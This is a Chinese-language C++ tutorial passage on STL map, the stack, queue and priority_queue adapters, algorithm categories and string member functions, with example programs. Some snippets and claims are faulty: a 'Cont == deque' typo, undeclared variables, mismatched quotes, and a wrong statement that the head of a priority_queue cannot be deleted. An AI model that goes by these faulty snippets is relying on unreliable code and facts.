<p>要使用 map，必须包含头文件 <map>。map 的定义如下：</map></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">Key</span>, <span class="title">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Pred</span> = <span class="title">less</span>&lt;Key&gt;, <span class="title">class</span> <span class="title">A</span> = <span class="title">allocator</span>&lt;T&gt; &gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">map</span>&#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">typedef</span> <span class="built_in">pair</span>&lt; <span class="keyword">const</span> Key, T &gt; value_type;</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>map 和 multimap 十分类似，区别在于 map 容器中元素的关键字不能重复。multimap 有的成员函数，map 都有。此外，map 还有成员函数 operator[]：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">T &amp; <span class="keyword">operator</span>[] (Key k);</span><br></pre></td></tr></table></figure>

<p>该成员函数返回 first 值为 k 的元素的 second 部分的引用。如果容器中没有元素的 first 值等于 k，则自动添加一个 first 值为 k 的元素。如果该元素的 second 成员变量是一个对象，则用无参构造函数对其初始化。</p>
<p>下面的程序演示了 map 的用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;  //使用map需要包含此头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">T1</span>,<span class="title">class</span> <span class="title">T2</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">ostream</span> &amp; <span class="title">operator</span> &lt;&lt;(ostream &amp; o,const pair&lt;T1,T2&gt; &amp; p)</span></span><br><span class="line"><span class="class">&#123; //将pair对象输出为 (first,second)形式</span></span><br><span class="line"><span class="class">    o &lt;&lt; &quot;(&quot; &lt;&lt; p.first  &lt;&lt; &quot;,&quot; &lt;&lt; p.second &lt;&lt; &quot;)&quot;;</span></span><br><span class="line"><span class="class">    return o;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">template&lt;class T&gt;</span></span><br><span class="line"><span class="class">void Print(T first,T last)</span></span><br><span class="line"><span class="class">&#123;//打印区间[first,last)</span></span><br><span class="line"><span class="class">    for( ; first != last; ++ first)</span></span><br><span class="line"><span class="class">        cout &lt;&lt;  * first &lt;&lt; &quot; &quot;;</span></span><br><span class="line"><span class="class">    cout &lt;&lt; endl;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">typedef map&lt;int,double,greater&lt;int&gt; &gt; MYMAP; //此容器关键字是整型，元素按关键字从大到小排序</span></span><br><span class="line"><span class="class">int main()</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class">    MYMAP mp;</span></span><br><span class="line"><span class="class">    mp.insert(MYMAP::value_type(15,2.7));</span></span><br><span class="line"><span class="class">    pair&lt;MYMAP::iterator,bool&gt; p = mp.insert(make_pair(15,99.3));</span></span><br><span class="line"><span class="class">    if(!p.second)</span></span><br><span class="line"><span class="class">        cout &lt;&lt; * (p.first) &lt;&lt; &quot; already exists&quot; &lt;&lt; endl; //会输出</span></span><br><span class="line"><span class="class">    cout &lt;&lt; &quot;1) &quot; &lt;&lt; mp.count(15) &lt;&lt; endl; //输出 1) 1</span></span><br><span class="line"><span class="class">    mp.insert(make_pair(20,9.3));</span></span><br><span class="line"><span class="class">    cout &lt;&lt; &quot;2) &quot; &lt;&lt; mp[40] &lt;&lt; endl;//如果没有关键字为40的元素，则插入一个</span></span><br><span class="line"><span class="class">    cout &lt;&lt; &quot;3) &quot;;Print(mp.begin(),mp.end());//输出：3) (40,0)(20,9.3)(15,2.7)</span></span><br><span class="line"><span class="class">    mp[15] = 6.28; //把关键字为15的元素值改成6.28</span></span><br><span class="line"><span class="class">    mp[17] = 3.14; //插入关键字为17的元素，并将其值设为3.14</span></span><br><span class="line"><span class="class">    cout &lt;&lt; &quot;4) &quot;;Print(mp.begin(),mp.end());</span></span><br><span class="line"><span class="class">    return 0;</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure>

<p>程序的输出结果如下：<br>(15,2.7) already exists</p>
<ol>
<li>1</li>
<li>0</li>
<li>(40,0) (20,9.3) (15,2.7)</li>
<li>(40,0) (20,9.3) (17,3.14) (15,6.28)</li>
</ol>
<p>第 17 行的<code>greater &lt;int&gt; &gt;</code>最右边的两个<code>&gt;</code>之间要有空格，否则 Dev <a href="http://c.biancheng.net/cplus/">C++</a> 会将它们当作右移运算符，导致编译出错。在 Visual Studio 2010 中无此问题。</p>
<p>第 22 行用 <a href="http://c.biancheng.net/stl/">STL</a> 中的函数模板 make_pair 生成一个 pair 模板类对象插入 mp 中。</p>
<p>第 23 行，如果插入成功，p.second 的值会是 true。显然这里不能成功，因为 map 不允许关键字重复。因为关键字重复而插入失败时，p.first 就指向容器中关键字相同的那个元素。</p>
<p>第 27 行要访问关键字为 40 的元素。在没有这个元素的情况下，一个关键字为 40、值为 0 的元素被自动插入容器。mp[40] 等价于<code>mp.operator[](40);</code>，其返回值是关键字为 40 的那个元素（不论是原有的还是新插入的）的 second 成员变量的引用。第 29 行和第 30 行的道理与此类似。</p>
<h4 id="C-容器适配器简介"><a href="#C-容器适配器简介" class="headerlink" title="C++ 容器适配器简介"></a>C++ 容器适配器简介</h4><p><a href="http://c.biancheng.net/stl/">STL</a> 中的容器适配器有 stack、queue、priority_queue 三种。它们都是在顺序容器的基础上实现的，屏蔽了顺序容器的一部分功能，突出或增加了另外一些功能。</p>
<p>容器适配器都有以下三个成员函数：</p>
<ul>
<li>push：添加一个元素。</li>
<li>top：返回顶部（对 stack 而言）或队头（对 queue、priority_queue 而言）的元素的引用。</li>
<li>pop：删除一个元素。</li>
</ul>
<p>容器适配器是没有迭代器的，因此 STL 中的各种排序、查找、变序等算法都不适用于容器适配器。</p>
<h4 id="C-stack，STL-stack详解"><a href="#C-stack，STL-stack详解" class="headerlink" title="C++ stack，STL stack详解"></a>C++ stack，STL stack详解</h4><p>stack 是容器适配器的一种。要使用 stack，必须包含头文件 <stack>。</stack></p>
<p>stack就是“栈”。栈是一种后进先出的元素序列，访问和删除都只能对栈顶的元素（即最后一个被加入栈的元素）进行，并且元素也只能被添加到栈顶。栈内的元素不能访问。如果一定要访问栈内的元素，只能将其上方的元素全部从栈中删除，使之变成栈顶元素才可以。</p>
<p>stack的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Cont</span> == <span class="title">deque</span> &lt;T&gt; &gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">stack</span>&#123;</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>第二个参数表明，在默认情况下，stack 就是用 deque 实现的。当然，也可以指定用 vector 或 list 实现。</p>
<p>虽然 stack 使用顺序容器实现，但它不提供顺序容器具有的成员函数。除了 size、 empty 这两个所有容器都有的成员函数外，stack 还有以下三个成员函数，如表 1 所示。</p>
<table>
<thead>
<tr>
<th>成员函数</th>
<th>功  能</th>
</tr>
</thead>
<tbody><tr>
<td>void pop();</td>
<td>弹出（即删除）栈顶元素</td>
</tr>
<tr>
<td>T &amp; top();</td>
<td>返回栈顶元素的引用。通过此函数可以读取栈顶元素的值，也可以修改栈顶元素</td>
</tr>
<tr>
<td>void push (const T &amp; x);</td>
<td>将 x 压入栈顶</td>
</tr>
</tbody></table>
<p>例题：编写程序，输入一个十进制数 n 和进制 k（k≤10），输出 n 对应的 k 进制数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;  //使用stack需要包含此头文件</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, k;</span><br><span class="line">    <span class="built_in">stack</span> &lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n &gt;&gt; k;  <span class="comment">//将n转换为k进制数</span></span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (n) &#123;</span><br><span class="line">        stk.push(n%k);</span><br><span class="line">        n /= k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (!stk.empty()) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; stk.top();</span><br><span class="line">        stk.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="C-queue和priority-queue，STL-queue和priority-queue"><a href="#C-queue和priority-queue，STL-queue和priority-queue" class="headerlink" title="C++ queue和priority_queue，STL queue和priority_queue"></a>C++ queue和priority_queue，STL queue和priority_queue</h4><p>queue 和 priority_queue 都是容器适配器，要使用它们，必须包含头文件 <queue>。</queue></p>
<p><strong>queue</strong></p>
<p>queue 就是“队列”。队列是先进先出的，和排队类似。队头的访问和删除操作只能在队头进行，添加操作只能在队尾进行。不能访问队列中间的元素。</p>
<p>queue 可以用 list 和 deque 实现，默认情况下用 deque 实现。</p>
<p>queue 的定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Cont</span> = <span class="title">deque</span>&lt;T&gt; &gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">queue</span>&#123;</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>queue 同样也有和 stack 类似的 push、pop、top 函数。区别在于，queue 的 push 发生在队尾，pop 和 top 发生在队头。</p>
<p><strong>priority_queue</strong></p>
<p>priority_queue 是“优先队列”。它和普通队列的区别在于，优先队列的队头元素总是最大的——即执行 pop 操作时，删除的总是最大的元素；执行 top 操作时，返回的是最大元素的引用。</p>
<p>priority_queue 可以用 vector 和 deque 实现，默认情况下用 vector 实现。</p>
<p>priority_queue 默认的元素比较器是 less <T>。也就是说，在默认情况下，要放入 priority_queue 的元素必须是能用“&lt;”运算符进行比较的，而且 priority _queue 保证以下条件总是成立：对于队头的元素 x 和任意非队头的元素 y，表达式“x&lt;y”必为 false。</T></p>
<p>priority_queue 定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt; <span class="class"><span class="keyword">class</span> <span class="title">T</span>, <span class="title">class</span> <span class="title">Container</span> = <span class="title">vector</span> &lt;T&gt;, <span class="title">class</span> <span class="title">Compare</span> = <span class="title">less</span>&lt;T&gt; &gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">priority_queue</span>&#123;</span></span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>priority_queue 的第三个类型参数可以用来指定排序规则。</p>
<p>和 set/multiset 不同，priority_queue 是使用“堆排序”技术实现的，其内部并非完全有序，但却能确保最大元素总在队头。因此，priority_queue 特别适用于“不停地在一堆元素中取走最大的元素”这种情况。priority_queue 插入和删除元素的复杂度都是 O(log(n))。虽然用 set/multiset 也能完成此项工作，但是 priority_queue 比它们略快一些。</p>
<p>priority_queue 队头的元素只能被查看或者修改，不能被删除。</p>
<p>priority_queue的用法示例如下。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">priority_queue</span>&lt;<span class="keyword">double</span>&gt; pq1;</span><br><span class="line">    pq1.push(<span class="number">3.2</span>); pq1.push(<span class="number">9.8</span>); pq1.push(<span class="number">9.8</span>); pq1.push(<span class="number">5.4</span>);</span><br><span class="line">    <span class="keyword">while</span>(!pq1.empty()) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; pq1.top() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        pq1.pop();</span><br><span class="line">    &#125; <span class="comment">//上面输出 9.8 9.8 5.4 3.2</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">priority_queue</span>&lt;<span class="keyword">double</span>,<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt;,greater&lt;<span class="keyword">double</span>&gt; &gt; pq2;</span><br><span class="line">    pq2.push(<span class="number">3.2</span>); pq2.push(<span class="number">9.8</span>); pq2.push(<span class="number">9.8</span>); pq2.push(<span class="number">5.4</span>);</span><br><span class="line">    <span class="keyword">while</span>(!pq2.empty()) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; pq2.top() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        pq2.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//上面输出 3.2 5.4 9.8 9.8</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序的输出结果是：<br>9.8 9.8 5.4 3.2<br>3.2 5.4 9.8 9.8</p>
<p>pq2 的排序规则和 pq1 相反，因此元素出队的顺序也相反。</p>
<h4 id="C-算法分类"><a href="#C-算法分类" class="headerlink" title="C++算法分类"></a>C++算法分类</h4><p>在 <a href="http://c.biancheng.net/stl/">STL</a> 中，算法就是函数模板。STL 中的算法大多数是用来对容器进行操作的，如排序、 查找等。大部分算法都是在头文件 <algorithm> 中定义的，还有些算法用于数值处理，定义在头文件 <numeric> 中。</numeric></algorithm></p>
<p>不同的教程对 STL 中的算法有不同的分类方法。本教程将算法分为以下七类：</p>
<ol>
<li>不变序列算法。</li>
<li>变值算法。</li>
<li>删除算法。</li>
<li>变序算法。</li>
<li>排序算法。</li>
<li>有序区间算法。</li>
<li>数值算法。</li>
</ol>
<p>本教程介绍前六类算法。第七类算法共有三个，除了前面已经介绍过的 accumulate 以外，另外两个算法既不常用，讲解起来又比较烦琐，本教程就不介绍了，有需要的读者可自行查阅相关资料。</p>
<p>有的算法可能同时属于多个分类。</p>
<p>许多算法都是重载的，有不止一个版本。篇幅所限，本教程往往只能列出其中的一个版本。有些算法也不给出原型，直接通过程序来演示其用法。</p>
<p>实际上，大多数重载的算法都有两个版本，其中一个用<code>==</code>判断元素是否相等，或用<code>&lt;</code>比较大小；而另一个版本多出来一个类型参数 Pred 以及函数形参 Pred op，该版本通过表达式<code>op(x, y)</code>的返回值是 true 还是 false 来判断 x 是否“等于”y 或者“小于”y。例如，在《<a href="http://c.biancheng.net/view/354.html">C++函数对象详解</a>》一节中的“应用实例2”中提到的 sort，再如下面有两个版本的 min_element：</p>
<p>iterate min_element(iterate first, iterate last);<br>iterate min_element(iterate first, iterate last, Pred op);</p>
<p>min_element 返回区间中最小的元素。第一个版本用<code>&lt;</code>比较大小，而第二个版本用自定义的比较器 op 来比较大小，op(x, y) 的值为 true，则说明 x 比 y 小。</p>
<p>类似 sort 和 min_element 这样有可自定义比较器版本的算法，在后文的表格中列出时，将加注“（可自定义比较器）”。</p>
<h4 id="C-string类（C-字符串）完全攻略"><a href="#C-string类（C-字符串）完全攻略" class="headerlink" title="C++ string类（C++字符串）完全攻略"></a>C++ string类（C++字符串）完全攻略</h4><p>string 类是 <a href="http://c.biancheng.net/stl/">STL</a> 中 basic_string 模板实例化得到的模板类。其定义如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> basic_string &lt;<span class="keyword">char</span>&gt; <span class="built_in">string</span>;</span><br></pre></td></tr></table></figure>

<p>basic_string 此处可以不必深究。</p>
<p>string 类的成员函数有很多，同一个名字的函数也常会有五六个重载的版本。篇幅所限，不能将这些原型一一列出并加以解释。这里仅对常用成员函数按功能进行分类，并直接给出应用的例子，通过例子，读者可以基本掌握这些成员函数的用法。</p>
<p>要想更深入地了解 string 类，还要阅读 <a href="http://c.biancheng.net/cplus/">C++</a> 的参考手册或编译器自带的联机资料。对于前面介绍过的字符串处理的内容，这里不再重复说明。</p>
<p><strong>1. 构造函数</strong></p>
<p>string 类有多个构造函数，用法示例如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">()</span></span>;  <span class="comment">// si = &quot;&quot;</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s2</span><span class="params">(<span class="string">&quot;Hello&quot;</span>)</span></span>;  <span class="comment">// s2 = &quot;Hello&quot;</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s3</span><span class="params">(<span class="number">4</span>, <span class="string">&#x27;K&#x27;</span>)</span></span>;  <span class="comment">// s3 = &quot;KKKK&quot;</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s4</span><span class="params">(<span class="string">&quot;12345&quot;</span>, <span class="number">1</span>, <span class="number">3</span>)</span></span>;  <span class="comment">//s4 = &quot;234&quot;，即 &quot;12345&quot; 的从下标 1 开始，长度为 3 的子串</span></span><br></pre></td></tr></table></figure>

<p>为称呼方便，本教程后文将从字符串下标 n 开始、长度为 m 的字符串称为“子串(n, m)”。</p>
<p>string 类没有接收一个整型参数或一个字符型参数的构造函数。下面的两种写法是错误的：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">&#x27;K&#x27;</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s2</span><span class="params">(<span class="number">123</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong>2. 对 string 对象赋值</strong></p>
<p>可以用 char* 类型的变量、常量，以及 char 类型的变量、常量对 string 对象进行赋值。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> s1;</span><br><span class="line">s1 = <span class="string">&quot;Hello&quot;</span>;  <span class="comment">// s1 = &quot;Hello&quot;</span></span><br><span class="line">s2 = <span class="string">&#x27;K&#x27;</span>;  <span class="comment">// s2 = &quot;K”</span></span><br></pre></td></tr></table></figure>

<p>string 类还有 assign 成员函数，可以用来对 string 对象赋值。assign 成员函数返回对象自身的引用。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1(&quot;12345&quot;), s2;</span><br><span class="line">s3.assign(s1);  <span class="comment">// s3 = s1</span></span><br><span class="line">s2.assign(s1, <span class="number">1</span>, <span class="number">2</span>);  <span class="comment">// s2 = &quot;23&quot;，即 s1 的子串(1, 2)</span></span><br><span class="line">s2.assign(<span class="number">4</span>, <span class="string">&#x27;K&#x27;</span>);  <span class="comment">// s2 = &quot;KKKK&quot;</span></span><br><span class="line">s2.assign(<span class="string">&quot;abcde&quot;</span>, <span class="number">2</span>, <span class="number">3</span>);  <span class="comment">// s2 = &quot;cde&quot;，即 &quot;abcde&quot; 的子串(2, 3)</span></span><br></pre></td></tr></table></figure>

<p><strong>3. 求字符串的长度</strong></p>
<p>length 成员函数返回字符串的长度。size 成员函数可以实现同样的功能。</p>
<p><strong>4. string对象中字符串的连接</strong></p>
<p>除了可以使用<code>+</code>和<code>+=</code>运算符对 string 对象执行字符串的连接操作外，string 类还有 append 成员函数，可以用来向字符串后面添加内容。append 成员函数返回对象自身的引用。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1(&quot;123&quot;), s2(&quot;abc&quot;);</span><br><span class="line">s1.append(s2);  <span class="comment">// s1 = &quot;123abc&quot;</span></span><br><span class="line">s1.append(s2, <span class="number">1</span>, <span class="number">2</span>);  <span class="comment">// s1 = &quot;123abcbc&quot;</span></span><br><span class="line">s1.append(<span class="number">3</span>, <span class="string">&#x27;K&#x27;</span>);  <span class="comment">// s1 = &quot;123abcbcKKK&quot;</span></span><br><span class="line">s1.append(<span class="string">&quot;ABCDE&quot;</span>, <span class="number">2</span>, <span class="number">3</span>);  <span class="comment">// s1 = &quot;123abcbcKKKCDE&quot;，添加 &quot;ABCDE&quot; 的子串(2, 3)</span></span><br></pre></td></tr></table></figure>

<p><strong>5. string对象的比较</strong></p>
<p>除了可以用 &lt;、&lt;=、==、!=、&gt;=、&gt; 运算符比较 string 对象外，string 类还有 compare 成员函数，可用于比较字符串。compare 成员函数有以下返回值：</p>
<ul>
<li>小于 0 表示当前的字符串小；</li>
<li>等于 0 表示两个字符串相等；</li>
<li>大于 0 表示另一个字符串小。</li>
</ul>
<p>例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s1(&quot;hello&quot;), s2(&quot;hello, world&quot;);</span><br><span class="line"><span class="keyword">int</span> n = s1.compare(s2);</span><br><span class="line">n = s1.compare(<span class="number">1</span>, <span class="number">2</span>, s2, <span class="number">0</span>, <span class="number">3</span>);  <span class="comment">//比较s1的子串 (1,2) 和s2的子串 (0,3)</span></span><br><span class="line">n = s1.compare(<span class="number">0</span>, <span class="number">2</span>, s2);  <span class="comment">// 比较s1的子串 (0,2) 和 s2</span></span><br><span class="line">n = s1.compare(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">n = s1.compare(<span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;Hello&quot;</span>);  <span class="comment">//比较 s1 的子串(1,2)和&quot;Hello”</span></span><br><span class="line">n = s1.compare(<span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;Hello&quot;</span>, <span class="number">1</span>, <span class="number">2</span>);  <span class="comment">//比较 s1 的子串(1,2)和 &quot;Hello&quot; 的子串(1,2)</span></span><br></pre></td></tr></table></figure>

<p><strong>6. 求 string 对象的子串</strong></p>
<p>substr 成员函数可以用于求子串 (n, m)，原型如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">substr</span><span class="params">(<span class="keyword">int</span> n = <span class="number">0</span>, <span class="keyword">int</span> m = <span class="built_in">string</span>::npos)</span> <span class="keyword">const</span></span>;</span><br></pre></td></tr></table></figure>

<p>调用时，如果省略 m 或 m 超过了字符串的长度，则求出来的子串就是从下标 n 开始一直到字符串结束的部分。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> s1 = <span class="string">&quot;this is ok&quot;</span>;</span><br><span class="line"><span class="built_in">string</span> s2 = s1.substr(<span class="number">2</span>, <span class="number">4</span>);  <span class="comment">// s2 = &quot;is i&quot;</span></span><br><span class="line">s2 = s1.substr(<span class="number">2</span>);  <span class="comment">// s2 = &quot;is is ok&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>7. 交换两个string对象的内容</strong></p>
<p>swap 成员函数可以交换两个 string 对象的内容。例如：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">&quot;West”), s2(&quot;</span>East<span class="string">&quot;);</span></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="string">s1.swap(s2);  // s1 = &quot;</span>East<span class="string">&quot;，s2 = &quot;</span>West<span class="string">&quot;</span></span></span></span><br></pre></td></tr></table></figure>

<p><strong>8. 查找子串和字符</strong></p>
<p>string 类有一些查找子串和字符的成员函数，它们的返回值都是子串或字符在 string 对象字符串中的位置（即下标）。如果查不到，则返回 string::npos。string: :npos 是在 string 类中定义的一个静态常量。这些函数如下：</p>
<ul>
<li>find：从前往后查找子串或字符出现的位置。</li>
<li>rfind：从后往前查找子串或字符出现的位置。</li>
<li>find_first_of：从前往后查找何处出现另一个字符串中包含的字符。例如：</li>
<li>s1.find_first_of(“abc”); //查找s1中第一次出现”abc”中任一字符的位置</li>
<li>find_last_of：从后往前查找何处出现另一个字符串中包含的字符。</li>
<li>find_first_not_of：从前往后查找何处出现另一个字符串中没有包含的字符。</li>
<li>find_last_not_of：从后往前查找何处出现另一个字符串中没有包含的字符。</li>
</ul>
<p>下面是 string 类的查找成员函数的示例程序。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">s1</span><span class="params">(<span class="string">&quot;Source Code&quot;</span>)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find(<span class="string">&#x27;u&#x27;</span>)) != <span class="built_in">string</span>::npos) <span class="comment">//查找 u 出现的位置</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1) &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;,&quot;</span> &lt;&lt; s1.substr(n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//输出 l)2,urce Code</span></span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find(<span class="string">&quot;Source&quot;</span>, <span class="number">3</span>)) == <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="comment">//从下标3开始查找&quot;Source&quot;，找不到</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2) &quot;</span> &lt;&lt; <span class="string">&quot;Not Found&quot;</span> &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 2) Not Found</span></span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find(<span class="string">&quot;Co&quot;</span>)) != <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="comment">//查找子串&quot;Co&quot;。能找到，返回&quot;Co&quot;的位置</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3) &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; s1.substr(n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//输出 3) 7, Code</span></span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find_first_of(<span class="string">&quot;ceo&quot;</span>)) != <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="comment">//查找第一次出现或 &#x27;c&#x27;、&#x27;e&#x27;或&#x27;o&#x27;的位置</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;4) &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; s1.substr(n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//输出 4) l, ource Code</span></span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find_last_of(<span class="string">&#x27;e&#x27;</span>)) != <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="comment">//查找最后一个 &#x27;e&#x27; 的位置</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;5) &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; s1.substr(n) &lt;&lt; <span class="built_in">endl</span>;  <span class="comment">//输出 5) 10, e</span></span><br><span class="line">    <span class="keyword">if</span> ((n = s1.find_first_not_of(<span class="string">&quot;eou&quot;</span>, <span class="number">1</span>)) != <span class="built_in">string</span>::npos)</span><br><span class="line">        <span class="comment">//从下标1开始查找第一次出现非 &#x27;e&#x27;、&#x27;o&#x27; 或 &#x27;u&#x27; 字符的位置</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;6) &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; s1.substr(n) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//输出 6) 3, rce Code</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>9. 替换子串</strong></p>
<p>replace 成员函数可以对 string 对象中的子串进行替换，返回值为对象自身的引用。例如：</p>
